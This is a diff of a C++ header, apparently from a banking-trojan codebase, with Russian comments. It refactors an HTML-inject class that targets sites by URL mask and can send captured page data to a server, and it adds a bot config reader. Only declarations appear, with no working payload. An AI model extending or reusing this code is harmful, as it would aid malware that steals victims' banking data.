@@ -82,6 +82,12 @@ class THTMLInject : public TEventContainer
 private:
     THTMLInjectList *FOwner;
 	PList  FInjects;   // Список инжектов (список элементов типа PHTMLInject)
+	LONG   FRefCount;  // Количество текущих блокировок инжекта
+
+	void AddRef();
+	void Release();
+
+	friend class THTMLInjectList;
 	friend class THTMLInjectData;
 public:
 	string URL;       // Маска сайта для которого необходимо обрабатывать страницы
@@ -90,7 +96,6 @@ public:
 	bool   IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
 	bool   Disabled;   // Не использовать инжект (Для отладочной программы)
 	bool   Used;       // Признак того что маска использовалась
-	DWORD  RefCount;  // Количество текущих блокировок инжекта
 	bool   DestroyAfterRelease; // Уничтожить инжект после обнуления счётчика
 	DWORD  ID;         // Ижентификатор, Для внутренних нужд
 	string Comment;   // Коментарий к инжекту, только для редактора
@@ -99,10 +104,10 @@ public:
 	~THTMLInject();
 
 	THTMLInjectData* AddData();
+	void Clear();
 	inline int Count() {return List::Count(FInjects);}
 	inline THTMLInjectData* Items(int Index) const {return (THTMLInjectData*)List::GetItem(FInjects, Index);}
 	inline THTMLInjectData* operator[](int Index) const { return Items(Index); };
-	void Clear();
 };
 
 
@@ -152,6 +157,20 @@ public:
 
 	void Clear();
 	bool LoadFromFile(const string &FileName);
+};
+
+
+//***********************************************************
+//  TBJBConfigReader - Класс чтения настроек из BJB конфига
+//***********************************************************
+class TBJBConfigReader : public TBotObject
+{
+private:
+	LPVOID FBuf;
+	DWORD  FSize;
+public:
+	TBJBConfigReader(LPVOID Buf, DWORD BufSize);
+    bool Read(TBotConfig* Config);
 };
 
 
